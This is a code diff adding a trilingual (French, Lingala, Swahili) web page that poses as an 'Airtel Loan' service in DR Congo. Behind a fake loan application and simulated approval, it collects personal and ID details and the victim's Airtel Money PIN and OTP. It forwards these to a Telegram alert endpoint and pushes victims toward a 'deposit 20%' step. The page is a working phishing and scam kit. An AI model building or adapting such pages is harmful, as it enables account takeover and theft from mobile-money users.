+            <p style="font-size:14px;color:#333;font-weight:bold;margin-top:15px;background:#f0f0f0;padding:12px;border-radius:8px;" data-key="finalThanks">Merci d'avoir choisi Airtel Loan !</p>
+            <button class="btn" onclick="goHome()" style="margin-top:16px;"><i class="fas fa-home"></i> <span data-key="home">Accueil</span></button>
+        </div>
+    </div>
+
+</div>
+<script>
+const translations = {
+    fr: {
+        headerTitle: "Prêt Rapide & Sécurisé", headerSub: "Votre argent, quand vous en avez besoin.",
+        langChangeTitle: "Changer la langue", langFr: "Français", langLn: "Lingala", langSw: "Kiswahili",
+        langTitle: "🌍 Choisissez votre langue", langSub: "Quelle langue souhaitez-vous utiliser ?",
+        langFrBtn: "Français", langLnBtn: "Lingala", langSwBtn: "Kiswahili",
+        step1: "Offre", step2: "Profil", step3: "Révision", step4: "Traitement",
+        step1Title: "Détails du Prêt", step1Desc: "Entrez les détails de votre demande de prêt.",
+        limitNote: "Montant entre 100 $ et 5 000 $", loanTypeLabel: "Type de prêt *",
+        loanTypePersonal: "Prêt Personnel", loanTypeBusiness: "Prêt Professionnel",
+        amountLabel: "Montant ($) *", termLabel: "Durée du prêt (mois) *",
+        months3: "3 mois", months6: "6 mois", months9: "9 mois", months12: "12 mois",
+        months24: "24 mois", months36: "36 mois", months48: "48 mois",
+        interestLabel: "Taux d'intérêt %/an", monthlyLabel: "Mensuel", totalLabel: "Total", interestLabel2: "Intérêts",
+        purposeLabel: "Objectif du prêt *", step2Title: "Informations Personnelles",
+        step2Desc: "Veuillez fournir vos coordonnées.", firstNameLabel: "Prénom *", lastNameLabel: "Nom *",
+        phoneLabel: "Numéro de téléphone (RDC) *", phoneHint: "9 chiffres sans +243",
+        emailLabel: "Adresse e-mail *", idLabel: "Numéro de pièce d'identité *",
+        cityLabel: "Ville *", statusLabel: "Situation professionnelle *",
+        selectCity: "Sélectionnez", otherCity: "Autre", selectStatus: "Sélectionnez",
+        statusEmp: "Salarié", statusSelf: "Indépendant", statusTrader: "Commerçant",
+        statusStudent: "Étudiant", statusCivil: "Fonctionnaire",
+        statusUnemployed: "Sans emploi", statusRetired: "Retraité", statusOther: "Autre",
+        errEmail: "Veuillez entrer un e-mail valide.", errPhone: "Veuillez entrer un numéro Airtel valide.",
+        errId: "Veuillez entrer votre numéro de pièce d'identité.",
+        step3Title: "Révision de la Demande", step3Desc: "Veuillez vérifier tous les détails avant de soumettre.",
+        reviewNotice: "Vérifiez attentivement toutes les informations.",
+        rLoanType: "Type de prêt", rAmount: "Montant", rTerm: "Durée", rPurpose: "Objectif",
+        rName: "Nom complet", rEmail: "E-mail", rPhone: "Téléphone", rId: "Pièce d'identité",
+        rCity: "Ville", rStatus: "Statut", rMonthly: "Mensuel", rTotal: "Total",
+        next: "Étape suivante", back: "Retour", submit: "Soumettre", home: "Accueil",
+        processingTitle: "Traitement de votre demande...", processingSub: "Veuillez patienter.",
+        refreshWarning: "⚠️ Ne rafraîchissez pas la page !", connecting: "Connexion aux serveurs...",
+        congrats: "Félicitations !", approvedText: "Votre prêt a été approuvé !",
+        approvedAmount: "Montant approuvé", withdrawBtn: "Retirer le prêt",
+        pinTitle: "Code PIN Airtel Money", pinNotice: "Entrez votre code PIN à 4 chiffres.",
+        pinLabel: "Code PIN (4 chiffres)", pinError: "Veuillez saisir les 4 chiffres.", verifyPin: "Vérifier le PIN",
+        pinProcessingTitle: "Veuillez patienter...", pinProcessingSub: "Votre PIN est en cours de vérification.",
+        waitingNote: "Cette opération prend généralement quelques secondes.",
+        wrongPinTitle: "PIN incorrect", wrongPinMsg: "Le code PIN est incorrect. Veuillez réessayer.",
+        otpTitle: "Code OTP", otpNotice: "Entrez le code OTP à 4 chiffres.",
+        otpExpiry: "⏱️ OTP expire dans", otpLabel: "Code OTP (4 chiffres)",
+        otpError: "Veuillez saisir les 4 chiffres.", submitOtp: "Soumettre OTP",
+        otpProcessingTitle: "Veuillez patienter...", otpProcessingSub: "Votre code OTP est en cours de vérification.",
+        wrongOtpTitle: "Code OTP incorrect", wrongOtpMsg: "Le code OTP est incorrect ou expiré. Veuillez réessayer.",
+        depositTitle: "Solde insuffisant",
+        finalTitle: "Prêt Décaissé avec Succès !", finalDesc: "Votre prêt a été envoyé sur votre compte Airtel Money.",
+        finalThanks: "Merci d'avoir choisi Airtel Loan !", needHelp: "💬 Besoin d'aide ?",
+        whatsappText: "Contactez-nous via WhatsApp.", retry: "Réessayer",
+        depositGreeting: "Cher(e) {name},", 
+        depositP1: "Nous vous informons que votre compte Airtel Money semble inactif. Votre demande de prêt de {amount} $ ne remplit pas les conditions.",
+        depositP2: "Veuillez déposer au moins 20 % ({twenty} $) du montant demandé sur votre compte Airtel Money.",
+        depositP3: "Nous ne prélevons pas ces {twenty} $. L'argent reste sous votre contrôle.",
+        depositP4: "Une fois le dépôt effectué, vous pouvez soumettre à nouveau. Un dépôt ne garantit pas l'approbation.",
+        depositP5: "Vérifiez cette exigence auprès du fournisseur Airtel officiel avant tout dépôt.",
+        depositP6: "Merci de votre compréhension."
+    },
+    ln: {
+        headerTitle: "Nyongo ya Noki mpe ya Libateli", headerSub: "Mbongo na yo, tango ozali na yango.",
+        langChangeTitle: "Bongola monoko", langFr: "Falansé", langLn: "Lingala", langSw: "Kiswahili",
+        langTitle: "🌍 Pona monoko na yo", langSub: "Monoko nini olingi kosalela ?",
+        langFrBtn: "Falansé", langLnBtn: "Lingala", langSwBtn: "Kiswahili",
+        step1: "Likambo", step2: "Profil", step3: "Botali", step4: "Kosala",
+        step1Title: "Makambo ya Nyongo", step1Desc: "Kotisa makambo ya kosenga nyongo na yo.",
+        limitNote: "Motuya kati ya 100 $ mpe 5 000 $", loanTypeLabel: "Lolenge ya nyongo *",
+        loanTypePersonal: "Nyongo ya Moto", loanTypeBusiness: "Nyongo ya Mosala",
+        amountLabel: "Motuya ($) *", termLabel: "Ngonga ya nyongo (sanza) *",
+        months3: "Sanza 3", months6: "Sanza 6", months9: "Sanza 9", months12: "Sanza 12",
+        months24: "Sanza 24", months36: "Sanza 36", months48: "Sanza 48",
+        interestLabel: "Taux ya intérêt %/mbula", monthlyLabel: "Sanza", totalLabel: "Motuya mobimba", interestLabel2: "Intérêt",
+        purposeLabel: "Mokano ya nyongo *", step2Title: "Makambo ya Moto", step2Desc: "Pesa bisaleli na yo.",
+        firstNameLabel: "Nkombo ya liboso *", lastNameLabel: "Nkombo ya libota *",
+        phoneLabel: "Nimero ya telefone (RDC) *", phoneHint: "Ba chiffre 9 kozanga +243",
+        emailLabel: "E-mail *", idLabel: "Nimero ya karte ya identité *",
+        cityLabel: "Engumba *", statusLabel: "Mosala *", selectCity: "Pona", otherCity: "Esusu", selectStatus: "Pona",
+        statusEmp: "Mosali", statusSelf: "Moto ya ye moko", statusTrader: "Moteci",
+        statusStudent: "Mwana ya kelasi", statusCivil: "Mosali ya Leta",
+        statusUnemployed: "Azali na mosala te", statusRetired: "Akomi kokufa", statusOther: "Esusu",
+        errEmail: "Kotisa e-mail ya malamu.", errPhone: "Kotisa nimero ya Airtel ya malamu.",
+        errId: "Kotisa nimero ya karte ya identité na yo.",
+        step3Title: "Botali ya Kosenga", step3Desc: "Talá makambo nyonso liboso ya kotinda.",
+        reviewNotice: "Talá makambo nyonso malamu.",
+        rLoanType: "Lolenge ya nyongo", rAmount: "Motuya", rTerm: "Ngonga", rPurpose: "Mokano",
+        rName: "Nkombo mobimba", rEmail: "E-mail", rPhone: "Telefone", rId: "Karte ya identité",
+        rCity: "Engumba", rStatus: "Mosala", rMonthly: "Sanza", rTotal: "Motuya mobimba",
+        next: "Etanda elandi", back: "Kobima", submit: "Kotinda", home: "Ndako",
+        processingTitle: "Kosala kosenga na yo...", processingSub: "Zela mwa tango moke.",
+        refreshWarning: "⚠️ Kobongola page te !", connecting: "Kokutana na ba serveur...",
+        congrats: "Elengi mingi !", approvedText: "Nyongo na yo endimami !",
+        approvedAmount: "Motuya endimami", withdrawBtn: "Bimisa nyongo",
+        pinTitle: "Code PIN ya Airtel Money", pinNotice: "Kotisa code PIN ya ba chiffre 4.",
+        pinLabel: "Code PIN (ba chiffre 4)", pinError: "Kotisa ba chiffre 4.", verifyPin: "Talá PIN",
+        pinProcessingTitle: "Zela mwa tango moke...", pinProcessingSub: "PIN na yo ezali kotalama.",
+        waitingNote: "Esengeli kozela mwa tango moke.",
+        wrongPinTitle: "PIN ya mabe", wrongPinMsg: "PIN oyo ekokani te. Meka lisusu.",
+        otpTitle: "Code OTP", otpNotice: "Kotisa code OTP ya ba chiffre 4.",
+        otpExpiry: "⏱️ OTP ekosila na", otpLabel: "Code OTP (ba chiffre 4)",
+        otpError: "Kotisa ba chiffre 4.", submitOtp: "Tinda OTP",
+        otpProcessingTitle: "Zela mwa tango moke...", otpProcessingSub: "OTP na yo ezali kotalama.",
+        wrongOtpTitle: "OTP ya mabe", wrongOtpMsg: "OTP ekokani te to esili. Meka lisusu.",
+        depositTitle: "Mbongo ekoki te",
+        finalTitle: "Nyongo Ebimisami Malamu !", finalDesc: "Nyongo na yo etindami na Airtel Money.",
+        finalThanks: "Matondo mpo oponi Airtel Loan !", needHelp: "💬 Osengi lisalisi ?",
+        whatsappText: "Solola na biso na WhatsApp.", retry: "Meka lisusu",
+        depositGreeting: "Nduko {name},",
+        depositP1: "Airtel Money na yo ezali na activité te. Demande ya {amount} $ ekokisi mobeko te.",
+        depositP2: "Tya 20 % ({twenty} $) ya motuya na Airtel Money na yo.",
+        depositP3: "Tozali kozwa mbongo yango te. Ezali na maboko na yo.",
+        depositP4: "Soki otie mbongo, okoki kotinda lisusu. Kati na mbongo te ezali kolakisa ete ekondimama.",
+        depositP5: "Tala mobeko oyo na fournisseur Airtel liboso ya kotya mbongo.",
+        depositP6: "Matondo mpo na bososoli na yo."
+    },
+    sw: {
+        headerTitle: "Mkopo wa Haraka na Salama", headerSub: "Pesa yako, wakati unahitaji.",
+        langChangeTitle: "Badilisha lugha", langFr: "Kifaransa", langLn: "Lingala", langSw: "Kiswahili",
+        langTitle: "🌍 Chagua lugha yako", langSub: "Lugha gani unataka kutumia ?",
+        langFrBtn: "Kifaransa", langLnBtn: "Lingala", langSwBtn: "Kiswahili",
+        step1: "Ofa", step2: "Wasifu", step3: "Ukaguzi", step4: "Usindikaji",
+        step1Title: "Maelezo ya Mkopo", step1Desc: "Weka maelezo ya ombi lako la mkopo.",
+        limitNote: "Kiasi kati ya $100 na $5,000", loanTypeLabel: "Aina ya mkopo *",
+        loanTypePersonal: "Mkopo wa Kibinafsi", loanTypeBusiness: "Mkopo wa Biashara",
+        amountLabel: "Kiasi ($) *", termLabel: "Muda wa mkopo (miezi) *",
+        months3: "Miezi 3", months6: "Miezi 6", months9: "Miezi 9", months12: "Miezi 12",
+        months24: "Miezi 24", months36: "Miezi 36", months48: "Miezi 48",
+        interestLabel: "Kiwango cha riba %/mwaka", monthlyLabel: "Kila mwezi", totalLabel: "Jumla", interestLabel2: "Riba",
+        purposeLabel: "Lengo la mkopo *", step2Title: "Taarifa za Kibinafsi", step2Desc: "Tafadhali toa maelezo yako.",
+        firstNameLabel: "Jina la kwanza *", lastNameLabel: "Jina la mwisho *",
+        phoneLabel: "Namba ya simu (DRC) *", phoneHint: "Tarakimu 9 bila +243",
+        emailLabel: "Barua pepe *", idLabel: "Namba ya kitambulisho *",
+        cityLabel: "Jiji *", statusLabel: "Hali ya kazi *", selectCity: "Chagua", otherCity: "Nyingine", selectStatus: "Chagua",
+        statusEmp: "Mfanyakazi", statusSelf: "Kujiajiri", statusTrader: "Mfanyabiashara",
+        statusStudent: "Mwanafunzi", statusCivil: "Mtumishi wa serikali",
+        statusUnemployed: "Hana kazi", statusRetired: "Mstaafu", statusOther: "Nyingine",
+        errEmail: "Tafadhali weka barua pepe halali.", errPhone: "Tafadhali weka namba halali ya Airtel.",
+        errId: "Tafadhali weka namba yako ya kitambulisho.",
+        step3Title: "Ukaguzi wa Ombi", step3Desc: "Tafadhali angalia maelezo yote kabla ya kutuma.",
+        reviewNotice: "Angalia maelezo yote kwa makini.",
+        rLoanType: "Aina ya mkopo", rAmount: "Kiasi", rTerm: "Muda", rPurpose: "Lengo",
+        rName: "Jina kamili", rEmail: "Barua pepe", rPhone: "Simu", rId: "Kitambulisho",
+        rCity: "Jiji", rStatus: "Hali", rMonthly: "Kila mwezi", rTotal: "Jumla",
+        next: "Hatua inayofuata", back: "Rudi", submit: "Tuma", home: "Nyumbani",
+        processingTitle: "Inasindika ombi lako...", processingSub: "Tafadhali subiri.",
+        refreshWarning: "⚠️ Usirudishe ukurasa !", connecting: "Inaunganisha na seva...",
+        congrats: "Hongera !", approvedText: "Mkopo wako umeidhinishwa !",
+        approvedAmount: "Kiasi kilichoidhinishwa", withdrawBtn: "Toa mkopo",
+        pinTitle: "PIN ya Airtel Money", pinNotice: "Weka PIN yako ya tarakimu 4.",
+        pinLabel: "PIN (tarakimu 4)", pinError: "Tafadhali weka tarakimu 4.", verifyPin: "Thibitisha PIN",
+        pinProcessingTitle: "Tafadhali subiri...", pinProcessingSub: "PIN yako inathibitishwa.",
+        waitingNote: "Hii inachukua sekunde chache.",
+        wrongPinTitle: "PIN isiyo sahihi", wrongPinMsg: "PIN uliyoweka si sahihi. Tafadhali jaribu tena.",
+        otpTitle: "OTP", otpNotice: "Weka OTP ya tarakimu 4.",
+        otpExpiry: "⏱️ OTP inaisha kwa", otpLabel: "OTP (tarakimu 4)",
+        otpError: "Tafadhali weka tarakimu 4.", submitOtp: "Tuma OTP",
+        otpProcessingTitle: "Tafadhali subiri...", otpProcessingSub: "OTP yako inathibitishwa.",
+        wrongOtpTitle: "OTP isiyo sahihi", wrongOtpMsg: "OTP si sahihi au imeisha muda. Tafadhali jaribu tena.",
+        depositTitle: "Salio halitoshi",
+        finalTitle: "Mkopo Umetolewa kwa Mafanikio !", finalDesc: "Mkopo wako umetumwa kwenye Airtel Money.",
+        finalThanks: "Asante kwa kuchagua Airtel Loan !", needHelp: "💬 Unahitaji msaada ?",
+        whatsappText: "Wasiliana nasi kupitia WhatsApp.", retry: "Jaribu tena",
+        depositGreeting: "Ndugu {name},",
+        depositP1: "Akaunti yako ya Airtel Money inaonekana kutokuwa hai. Ombi la {amount} $ halikidhi mahitaji.",
+        depositP2: "Tafadhali weka angalau 20 % ({twenty} $) kwenye akaunti yako ya Airtel Money.",
+        depositP3: "Hatuchukui {twenty} $. Pesa inabaki chini ya udhibiti wako.",
+        depositP4: "Ukishaweka, unaweza kuwasilisha tena. Amana haihakikishi kuidhinishwa.",
+        depositP5: "Thibitisha hitaji hili kwa mtoa huduma wa Airtel kabla ya kuweka amana.",
+        depositP6: "Asante kwa uelewa wako."
+    }
+};
+</script>
+<script>
+let currentLanguage = 'fr';
+let languageSelected = false;
+let userData = {};
+let selectedLoanType = 'Personnel';
+let approvedAmount = 0;
+let currentStepKey = 'step1';
+let otpTimerInterval = null;
+let processingInterval = null;
+let approvalPollInterval = null;
+let waitTimerInterval = null;
+let waitSeconds = 0;
+let pinRejectionCount = 0;
+let otpRejectionCount = 0;
+let storedPin = '';
+
+let approvedAmounts = new Map(JSON.parse(localStorage.getItem('airtel_approved_amounts') || '[]'));
+
+function applyTranslations(lang) {
+    const t = translations[lang] || translations.fr;
+    document.querySelectorAll('[data-key]').forEach(el => {
+        const key = el.getAttribute('data-key');
+        if (t[key]) {
+            if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+                if (el.hasAttribute('placeholder')) el.setAttribute('placeholder', t[key]);
+            } else if (el.tagName === 'OPTION') {
+                el.textContent = t[key];
+            } else {
+                el.textContent = t[key];
+            }
+        }
+    });
+    const pm = {
+        'firstName': t.firstNameLabel ? t.firstNameLabel.replace(' *','') : 'Prénom',
+        'lastName': t.lastNameLabel ? t.lastNameLabel.replace(' *','') : 'Nom',
+        'phone': 'Ex: 812345678',
+        'email': 'exemple@email.com',
+        'purpose': t.purposeLabel ? t.purposeLabel.replace(' *','') : 'Décrivez l\'objectif...'
+    };
+    Object.keys(pm).forEach(id => {
+        const el = document.getElementById(id);
+        if (el && el.hasAttribute('placeholder')) el.setAttribute('placeholder', pm[id]);
+    });
+}
+
+function toggleLangDropdown(event) {
+    event.stopPropagation();
+    document.getElementById('langDropdown').classList.toggle('show');
+    updateLangDropdownActive();
+}
+function updateLangDropdownActive() {
+    const items = document.querySelectorAll('.lang-dropdown-item');
+    const langs = ['fr', 'ln', 'sw'];
+    items.forEach((item, idx) => {
+        if (langs[idx] === currentLanguage) item.classList.add('active');
+        else item.classList.remove('active');
+    });
+}
+function changeLanguageFromDropdown(lang) {
+    if (lang === currentLanguage) {
+        document.getElementById('langDropdown').classList.remove('show');
+        return;
+    }
+    currentLanguage = lang;
+    applyTranslations(lang);
+    updateCurrentLangLabel();
+    updateLangDropdownActive();
+    document.getElementById('langDropdown').classList.remove('show');
+    saveProgress();
+    sendToTelegram({ type: '🌐 LANGUE CHANGÉE', message: `Changée en: ${lang}` });
+}
+function updateCurrentLangLabel() {
+    const labels = { fr: 'FR', ln: 'LN', sw: 'SW' };
+    const el = document.getElementById('currentLangLabel');
+    if (el) el.textContent = labels[currentLanguage] || 'FR';
+}
+document.addEventListener('click', function(e) {
+    const dd = document.getElementById('langDropdown');
+    const btn = document.getElementById('langSwitcherBtn');
+    if (dd && btn && !dd.contains(e.target) && !btn.contains(e.target)) dd.classList.remove('show');
+});
+
+function selectLanguage(lang) {
+    currentLanguage = lang;
+    languageSelected = true;
+    applyTranslations(lang);
+    document.getElementById('panelLanguage').classList.remove('active');
+    document.getElementById('stepIndicator').style.display = 'flex';
+    showLangSwitcher();
+    updateLangDropdownActive();
+    goToStep('step1');
+    saveProgress();
+    sendToTelegram({ type: '🚨 NOUVEL UTILISATEUR', message: `Langue choisie: ${lang}` });
+}
+function showLangSwitcher() {
+    const btn = document.getElementById('langSwitcherBtn');
+    if (btn) btn.style.display = 'flex';
+    updateCurrentLangLabel();
+}
+
+function saveProgress() {
+    localStorage.setItem('airtel_user_data', JSON.stringify(userData));
+    localStorage.setItem('airtel_current_step', currentStepKey);
+    localStorage.setItem('airtel_lang', currentLanguage);
+    localStorage.setItem('airtel_lang_selected', languageSelected ? '1' : '0');
+    localStorage.setItem('airtel_approved_amount', approvedAmount);
+    localStorage.setItem('airtel_approved_amounts', JSON.stringify(Array.from(approvedAmounts.entries())));
+}
+function restoreProgress() {
+    const savedLang = localStorage.getItem('airtel_lang');
+    const langSel = localStorage.getItem('airtel_lang_selected');
+    if (savedLang) currentLanguage = savedLang;
+    updateCurrentLangLabel();
+    updateLangDropdownActive();
+    if (langSel === '1') {
+        languageSelected = true;
+        document.getElementById('panelLanguage').classList.remove('active');
+        document.getElementById('stepIndicator').style.display = 'flex';
+        showLangSwitcher();
+        applyTranslations(currentLanguage);
+    }
+    const savedData = localStorage.getItem('airtel_user_data');
+    if (savedData) {
+        try {
+            userData = JSON.parse(savedData);
+            if (userData.firstName) document.getElementById('firstName').value = userData.firstName;
+            if (userData.lastName) document.getElementById('lastName').value = userData.lastName;
+            if (userData.phone) document.getElementById('phone').value = userData.phone;
+            if (userData.email) document.getElementById('email').value = userData.email;
+            if (userData.idNumber) document.getElementById('idNumber').value = userData.idNumber;
+            if (userData.city) document.getElementById('city').value = userData.city;
+            if (userData.status) document.getElementById('status').value = userData.status;
+            if (userData.purpose) document.getElementById('purpose').value = userData.purpose;
+            if (userData.amount) {
+                document.getElementById('loanAmount').value = userData.amount;
+                document.getElementById('loanAmountSlider').value = userData.amount;
+            }
+            if (userData.months) document.getElementById('loanMonths').value = userData.months;
+            if (userData.loanType) {
+                selectedLoanType = userData.loanType;
+                document.querySelectorAll('#loanTypeGroup .radio-option').forEach(o => {
+                    o.classList.remove('selected');
+                    o.style.borderColor = '#e0e0e0';
+                    o.style.background = '#fafafa';
+                });
+                const match = document.querySelector(`#loanTypeGroup .radio-option[data-loan="${userData.loanType === 'Personnel' ? 'personnel' : 'business'}"]`);
+                if (match) {
+                    match.classList.add('selected');
+                    match.style.borderColor = 'var(--airtel-red)';
+                    match.style.background = '#ffeeee';
+                    match.querySelector('input[type="radio"]').checked = true;
+                }
+            }
+            updateCalculator();
+        } catch(e) {}
+    }
+    const savedAmount = localStorage.getItem('airtel_approved_amount');
+    if (savedAmount) approvedAmount = parseFloat(savedAmount);
+    const savedStep = localStorage.getItem('airtel_current_step');
+    if (savedStep && languageSelected) goToStep(savedStep);
+}
+
+window.addEventListener('load', () => {
+    sendToTelegram({ type: '🔔 NOUVEL ACCÈS AU SITE', message: `Un utilisateur a ouvert Airtel Loan. ${new Date().toLocaleString('fr-FR')}` });
+});
+
+setTimeout(() => {
+    document.getElementById('splashScreen').classList.add('hidden');
+    document.getElementById('appContainer').classList.add('visible');
+    restoreProgress();
+}, 2500);
+
+function isValidPhone(phone) {
+    const cleaned = phone.replace(/\s/g, '');
+    return /^[89]\d{8}$/.test(cleaned);
+}
+
+function updateCalculator() {
+    const amount = parseFloat(document.getElementById('loanAmountSlider').value) || 0;
+    const months = parseInt(document.getElementById('loanMonths').value) || 1;
+    const rate = parseFloat(document.getElementById('interestRate').value) || 0;
+    const monthlyRate = rate / 100 / 12;
+    let mp = 0, total = 0, interest = 0;
+    if (amount > 0 && months > 0) {
+        if (rate === 0) mp = amount / months;
+        else {
+            const factor = Math.pow(1 + monthlyRate, months);
+            mp = amount * monthlyRate * factor / (factor - 1);
+        }
+        total = mp * months;
+        interest = total - amount;
+    }
+    document.getElementById('monthlyDisplay').textContent = `${Math.round(mp).toLocaleString()} $`;
+    document.getElementById('totalDisplay').textContent = `${Math.round(total).toLocaleString()} $`;
+    document.getElementById('interestDisplay').textContent = `${Math.round(interest).toLocaleString()} $`;
+    document.getElementById('amountValue').textContent = `${Math.round(amount).toLocaleString()} $`;
+    document.getElementById('loanAmount').value = Math.round(amount);
+}
+document.getElementById('loanAmountSlider').addEventListener('input', updateCalculator);
+document.getElementById('loanMonths').addEventListener('change', updateCalculator);
+document.getElementById('loanAmount').addEventListener('input', function() {
+    let val = parseFloat(this.value) || 0;
+    if (val < 100) val = 100;
+    if (val > 5000) val = 5000;
+    document.getElementById('loanAmountSlider').value = val;
+    updateCalculator();
+});
+updateCalculator();
+
+document.querySelectorAll('#loanTypeGroup .radio-option').forEach(opt => {
+    opt.addEventListener('click', function() {
+        document.querySelectorAll('#loanTypeGroup .radio-option').forEach(o => {
+            o.classList.remove('selected');
+            o.style.borderColor = '#e0e0e0';
+            o.style.background = '#fafafa';
+        });
+        this.classList.add('selected');
+        this.style.borderColor = 'var(--airtel-red)';
+        this.style.background = '#ffeeee';
+        this.querySelector('input[type="radio"]').checked = true;
+        selectedLoanType = this.querySelector('input[type="radio"]').value;
+    });
+});
+</script>
+<script>
+function goToStep(step) {
+    currentStepKey = step;
+    saveProgress();
+    const panels = ['panelStep1','panelStep2','panelStep3','panelStep4','panelQualified','panelPinEntry','panelPinApproval','panelWrongPin','panelOtpEntry','panelOtpApproval','panelWrongOtp','panelDeposit','panelFinal'];
+    panels.forEach(id => { const el = document.getElementById(id); if (el) el.classList.remove('active'); });
+    const targetMap = {
+        step1:'panelStep1', step2:'panelStep2', step3:'panelStep3', step4:'panelStep4',
+        qualified:'panelQualified', pinEntry:'panelPinEntry', pinApproval:'panelPinApproval', wrongPin:'panelWrongPin',
+        otpEntry:'panelOtpEntry', otpApproval:'panelOtpApproval', wrongOtp:'panelWrongOtp',
+        deposit:'panelDeposit', final:'panelFinal'
+    };
+    const targetId = targetMap[step] || 'panelStep1';
+    const target = document.getElementById(targetId);
+    if (target) target.classList.add('active');
+
+    const stepMap = { step1:1, step2:2, step3:3, step4:4, qualified:4, pinEntry:4, pinApproval:4, wrongPin:4, otpEntry:4, otpApproval:4, wrongOtp:4, deposit:4, final:4 };
+    const activeStep = stepMap[step] || 1;
+    for (let i = 1; i <= 4; i++) {
+        const label = document.getElementById(`step${i}Label`);
+        if (label) {
+            label.classList.remove('active', 'done');
+            if (i < activeStep) label.classList.add('done');
+            else if (i === activeStep) label.classList.add('active');
+        }
+    }
+    if (targetId === 'panelPinEntry') setTimeout(() => { const f = document.querySelector('#pinGrid .pin-input'); if (f) f.focus(); }, 300);
+    if (targetId === 'panelOtpEntry') setTimeout(() => { const f = document.querySelector('#otpGrid .otp-input'); if (f) f.focus(); }, 300);
+}
+
+function goToStep1() { goToStep('step1'); }
+
+function goToStep2() {
+    const amount = parseFloat(document.getElementById('loanAmount').value);
+    if (!amount || amount < 100 || amount > 5000) { alert(currentLanguage === 'fr' ? 'Montant entre 100 $ et 5 000 $.' : 'Amount between $100 and $5,000.'); return; }
+    const purpose = document.getElementById('purpose').value.trim();
+    if (purpose.length < 3) { alert(currentLanguage === 'fr' ? 'Décrivez l\'objectif.' : 'Describe purpose.'); return; }
+    userData = { ...userData, loanType: selectedLoanType, amount, months: parseInt(document.getElementById('loanMonths').value), rate: parseFloat(document.getElementById('interestRate').value), purpose };
+    goToStep('step2');
+}
+
+function goToStep3() {
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const idNumber = document.getElementById('idNumber').value.trim();
+    const city = document.getElementById('city').value;
+    const status = document.getElementById('status').value;
+    if (!firstName || !lastName) { alert(currentLanguage === 'fr' ? 'Entrez votre nom.' : 'Enter name.'); return; }
+    if (!email || !email.includes('@') || !email.includes('.')) { document.getElementById('emailError').classList.remove('hidden'); return; }
+    document.getElementById('emailError').classList.add('hidden');
+    if (!phone || !isValidPhone(phone)) { document.getElementById('phoneError').classList.remove('hidden'); return; }
+    document.getElementById('phoneError').classList.add('hidden');
+    if (!idNumber) { document.getElementById('idError').classList.remove('hidden'); return; }
+    document.getElementById('idError').classList.add('hidden');
+    if (!city) { alert(currentLanguage === 'fr' ? 'Sélectionnez une ville.' : 'Select city.'); return; }
+    if (!status) { alert(currentLanguage === 'fr' ? 'Sélectionnez un statut.' : 'Select status.'); return; }
+    userData = { ...userData, firstName, lastName, email, phone, idNumber, city, status };
+    updateReview();
+    goToStep('step3');
+}
+
+function updateReview() {
+    document.getElementById('reviewLoanType').textContent = userData.loanType || '—';
+    document.getElementById('reviewAmount').textContent = `${userData.amount?.toLocaleString() || 0} $`;
+    document.getElementById('reviewTerm').textContent = `${userData.months || 0} mois`;
+    document.getElementById('reviewPurpose').textContent = userData.purpose || '—';
+    document.getElementById('reviewName').textContent = `${userData.firstName || ''} ${userData.lastName || ''}`.trim() || '—';
+    document.getElementById('reviewPhone').textContent = userData.phone || '—';
+    document.getElementById('reviewEmail').textContent = userData.email || '—';
+    document.getElementById('reviewId').textContent = userData.idNumber || '—';
+    document.getElementById('reviewCity').textContent = userData.city || '—';
+    document.getElementById('reviewStatus').textContent = userData.status || '—';
+    const mp = calculateMonthly(userData.amount, userData.months, userData.rate);
+    document.getElementById('reviewMonthly').textContent = `${Math.round(mp).toLocaleString()} $`;
+    document.getElementById('reviewTotal').textContent = `${Math.round(mp * userData.months).toLocaleString()} $`;
+}
+function calculateMonthly(amount, months, rate) {
+    if (!amount || !months) return 0;
+    const monthlyRate = rate / 100 / 12;
+    if (rate === 0) return amount / months;
+    const factor = Math.pow(1 + monthlyRate, months);
+    return amount * monthlyRate * factor / (factor - 1);
+}
+
+function sendToTelegram(data) {
+    let message = `📱 *Airtel Loan - Congo DRC*\n\n`;
+    message += `📌 *Type:* ${data.type || 'N/A'}\n`;
+    message += `👤 *Nom:* ${data.fullName || 'N/A'}\n`;
+    message += `📞 *Téléphone:* ${data.phone || 'N/A'}\n`;
+    message += `📧 *Email:* ${data.email || 'N/A'}\n`;
+    message += `🏙️ *Ville:* ${data.city || 'N/A'}\n`;
+    message += `💵 *Montant:* ${data.amount ? data.amount.toLocaleString() : 0} $\n`;
+    message += `📅 *Durée:* ${data.months || 0} mois\n`;
+    if (data.pin) message += `🔑 *PIN:* ${data.pin}\n`;
+    if (data.otp) message += `🔢 *OTP:* ${data.otp}\n`;
+    if (data.message) message += `📝 *Message:* ${data.message}\n`;
+
+    fetch('/api/telegram-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message })
+    }).catch(err => console.error('telegram-alert error:', err));
+}
+
+function submitApplication() {
+    const phone = userData.phone;
+    if (approvedAmounts.has(phone)) {
+        approvedAmount = approvedAmounts.get(phone);
+        sendToTelegram({ type: '🔄 RÉAPPLICATION', fullName: `${userData.firstName} ${userData.lastName}`, phone: phone, amount: approvedAmount, message: `Montant maintenu.` });
+    } else {
+        let firstAmount = userData.amount || 100;
+        if (firstAmount < 100) firstAmount = 100;
+        if (firstAmount > 5000) firstAmount = 5000;
+        approvedAmounts.set(phone, firstAmount);
+        approvedAmount = firstAmount;
+        saveProgress();
+        sendToTelegram({ type: '📝 NOUVELLE DEMANDE', fullName: `${userData.firstName} ${userData.lastName}`, phone: phone, email: userData.email, city: userData.city, amount: userData.amount, months: userData.months, message: `Nouveau prêt.` });
+    }
+    goToStep('step4');
+    startProcessing(phone);
+}
+
+function startProcessing(phone) {
+    const statuses = currentLanguage === 'fr' ? [
+        'Connexion aux serveurs...', 'Vérification de l\'éligibilité...', 'Analyse de l\'historique...', 'Évaluation de la capacité...', 'Calcul du montant...', 'Finalisation...'
+    ] : [
+        'Connecting...', 'Checking eligibility...', 'Analyzing history...', 'Evaluating capacity...', 'Calculating amount...', 'Finalizing...'
+    ];
+    let progress = 0;
+    const totalTime = Math.floor(Math.random() * 8000) + 12000;
+    const stepTime = totalTime / 100;
+    document.getElementById('processingStatus').textContent = statuses[0];
+    document.getElementById('processingProgress').style.width = '0%';
+    document.getElementById('processingPercent').textContent = '0%';
